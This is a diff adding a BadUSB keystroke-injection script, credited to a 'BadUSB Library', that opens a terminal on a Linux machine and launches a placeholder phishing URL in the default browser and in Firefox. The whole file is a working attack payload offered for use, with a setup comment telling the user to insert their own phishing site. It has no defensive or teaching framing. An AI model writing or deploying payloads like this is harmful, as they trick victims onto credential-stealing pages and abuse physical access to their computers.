@@ -1,0 +1,27 @@
+REM Title: Linux Phishing Site Opener
+REM Author: BadUSB Library
+REM Description: Opens phishing site in browser
+REM Target: Linux
+REM Category: Social Engineering
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace PHISHING_URL with your phishing site URL
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Open phishing site
+STRING xdg-open "PHISHING_URL"
+ENTER
+DELAY 2000
+
+REM Also open in Firefox
+STRING firefox "PHISHING_URL" &
+ENTER
+DELAY 2000
